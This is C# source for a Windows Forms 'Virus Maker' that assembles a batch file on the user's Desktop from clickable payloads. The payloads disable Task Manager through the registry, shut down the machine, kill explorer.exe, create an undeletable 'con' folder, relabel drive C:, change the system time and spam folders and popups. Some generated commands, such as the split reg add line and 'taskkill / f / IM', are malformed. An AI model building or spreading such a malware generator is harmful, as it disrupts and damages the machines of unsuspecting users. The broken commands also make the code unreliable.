﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Potato_Unlocker
{

    public partial class Form1 : Form
    {
        [DllImport("kernel32")]
        public static extern void Sleep(uint dwMilliseconds);
        public Form1()
        {
            InitializeComponent();
        }

        private void exit_Click(object sender, EventArgs e)
        {
            StringBuilder sb = new StringBuilder();
            foreach (string item in listBox1.Items)
                sb.Append(item + "\n");

            Random random = new Random();
            int number = random.Next(1, 1000);
            File.WriteAllText("C:\\Users\\" + Environment.UserName + "\\Desktop\\Virus" + number.ToString() + ".bat", sb.ToString());
            exit.Text = "!Файл создан!";
        }

        private void button2_Click(object sender, EventArgs e)
        {

        }

        int x = 0;

        private void timer1_Tick(object sender, EventArgs e)
        {
            
            if (x == 0)
            {
                this.Text = "Virus Maker";
            }
            else if (x == 1)
            {
                this.Text = "~VIrus Maker~";
            }
            else if (x == 2)
            {
                this.Text = "~~VirUs Maker~~";
            }
            else if (x == 3)
            {
                this.Text = "!~~Virus MAker~~!";
            }
            else if (x == 4)
            {
                this.Text = "~~Virus MakEr~~";
            }
            else if (x == 5)
            {
                this.Text = "~Virus Maker~";
            }
            else if (x == 6)
            {
                this.Text = "Virus Maker";
            }

            x++;

            if (x > 6)
            {
                x = 0;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            listBox1.Items.Add("start cmd");
        }

        private void button2_Click_1(object sender, EventArgs e)
        {
            listBox1.Items.Add("start explorer");
        }

        private void button3_Click(object sender, EventArgs e)
        {
            listBox1.Items.Add("start mspaint");
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked == true)
            {
                listBox1.Items.Add("reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System /v DisableTaskMgr /t ");
                listBox1.Items.Add("REG_DWORD /d 1 /f");
            }
            else
            {
                if (MessageBox.Show("ВНИМАНИЕ! ЭТО УДАЛИТ ВЕСЬ КОД(((", "Вы уверенны?!", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                {
                    listBox1.Items.Clear();
                    listBox1.Items.Add("@echo off");
                }
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            listBox1.Items.Add("start \"Virus\" \"cmd\" /c \"color 2 && dir /s C:\\\"");
        }

        private void button5_Click(object sender, EventArgs e)
        {
            listBox1.Items.Clear();
            listBox1.Items.Add("@echo off");
        }

        private void button8_Click(object sender, EventArgs e)
        {
            listBox1.Items.Add("time 2:28 >nul");
        }

        private void button6_Click(object sender, EventArgs e)
        {
            panel1.Visible = true;
        }

        private void button7_Click(object sender, EventArgs e)
        {
            listBox1.Items.Add("shutdown -s");
        }

        private void button11_Click(object sender, EventArgs e)
        {
            listBox1.Items.Add("set \"desktop=%USERPROFILE%\\Desktop\"");
            listBox1.Items.Add("for /l %%i in (1,1,10) do (");
            listBox1.Items.Add("mkdir \"%desktop%\\VIRUS%%i\"");
            listBox1.Items.Add(")");
        }

        private void button10_Click(object sender, EventArgs e)
        {
            listBox1.Items.Add("taskkill / f / IM explorer.exe");
        }

        private void button9_Click(object sender, EventArgs e)
        {
            listBox1.Items.Add("md \\\\.\\C:\\Users\\%username%\\Desktop\\con");
        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void button12_Click(object sender, EventArgs e)
        {
            string user_text = "";
            user_text = textBox1.Text ;
            listBox1.Items.Add("msg * " + user_text);
        }

        private void button14_Click(object sender, EventArgs e)
        {
            listBox1.Items.Add("label C:VIRUS");
        }
    }
}
